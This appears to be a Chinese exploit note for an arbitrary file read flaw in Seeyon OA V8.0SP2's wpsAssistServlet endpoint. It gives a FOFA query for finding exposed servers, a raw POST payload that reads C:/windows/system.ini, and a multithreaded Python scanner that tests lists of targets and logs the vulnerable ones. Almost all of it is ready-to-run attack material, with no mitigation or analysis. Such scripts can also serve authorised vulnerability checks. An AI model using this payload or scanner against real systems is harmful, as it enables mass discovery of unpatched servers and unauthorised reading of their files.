### FOFA

```markdown
app=“致远互联-OA” && title=“V8.0SP2”
```

### payload

```markdown
POST /seeyon/wpsAssistServlet HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Content-Length: 47
Content-Type: application/x-www-form-urlencoded

flag=template&templateUrl=C:/windows/system.ini
```

![image-20240917161504750](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240917161504750.png)

### poc

```python
import requests, sys, argparse, json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    banner = """

██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    

                                                    data: 2024-09-17
                                                    version: 1.0
                                                    author: hulless-oat
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='致远OA wpsAssistServlet接口存在任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()
    # 判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        # 多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/seeyon/wpsAssistServlet"
    url = target + payload
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "Connection": "Keep-Alive",
        "Content-Length": "47",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "flag=template&templateUrl=C:/windows/system.ini"

    try:
        res = requests.post(url=url, headers=headers, verify=False, timeout=10, data=data)
        if res.status_code == 200 and "[mci]" in res.text:
            print(f"{GREEN}[+]该网站存在任意文件读取漏洞：{target}\n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
                return True
        else:
            print(f"[-]该网站不存在任意文件读取漏洞")
    except:
        print(f"[*]该网站无法访问")
        return False

if __name__ == '__main__':
    main()
```

